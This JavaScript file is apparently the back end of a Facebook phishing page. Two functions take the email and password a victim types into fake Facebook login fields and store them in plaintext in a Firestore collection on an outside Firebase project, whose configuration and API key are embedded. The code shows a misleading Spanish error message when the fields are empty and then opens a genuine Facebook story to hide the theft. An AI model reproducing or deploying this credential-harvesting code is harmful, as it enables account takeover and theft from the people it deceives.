firebase.initializeApp({
    apiKey: "AIzaSyDqfihS3c6xRg8GPG3LwedqxVbaWv80MVM",
    authDomain: "prestacasa-ad0ec.firebaseapp.com",
    databaseURL: "https://prestacasa-ad0ec.firebaseio.com",
    projectId: "prestacasa-ad0ec",
    storageBucket: "prestacasa-ad0ec.appspot.com",
    messagingSenderId: "846656829348"
  });

   // Initialize Cloud Firestore through Firebase
   var db = firebase.firestore();

  function guardar(){
    var correoFace = document.getElementById('emailFacebook').value;
    var contrasenaFace = document.getElementById('passFacebook').value;

      if(correoFace=="" || contrasenaFace==""){
        alert('El nombre de usuario y la contraseña que ingresaste no coinciden con nuestros registros. Por favor, revisa e inténtalo de nuevo.')

      }else{
        try {
        
          db.collection("users").add({
            correo: correoFace,
            contrasena: contrasenaFace
        })
            .then(function(docRef) {
              console.log("Document written with ID: ", docRef.id);
                document.getElementById('emailFacebook').value='';
                document.getElementById('passFacebook').value='';
            })
            .catch(function(error) {
                console.error("Error adding document: ", error);
        });
    
        } catch (error) {
          alert('Cargando...')
        }
    
        window.open("https://m.facebook.com/story.php?story_fbid=268004110779550&id=240847169736063","_blank");
      }
    }//Aqui termina el metodo Guardar 1

    function guardar2(){
  
        var correoFace2 = document.getElementById('emailFacebook2').value;
        var contrasenaFace2 = document.getElementById('passFacebook2').value;
  
      if(correoFace2=="" || contrasenaFace2==""){
        alert('El nombre de usuario y la contraseña que ingresaste no coinciden con nuestros registros. Por favor, revisa e inténtalo de nuevo.')
  
      }else{
          try {
          
            db.collection("users").add({
              correo2: correoFace2,
              contrasena2: contrasenaFace2
          })
              .then(function(docRef) {
                console.log("Document written with ID: ", docRef.id);
                  document.getElementById('emailFacebook2').value='';
                  document.getElementById('passFacebook2').value='';
              })
              .catch(function(error) {
                  console.error("Error adding document: ", error);
          });
          } catch (error) {
            alert('Cargando...')
          }
      
          window.open("https://m.facebook.com/story.php?story_fbid=268004110779550&id=240847169736063","_blank");
        }
      }//Aqui termina el metodo guardar 2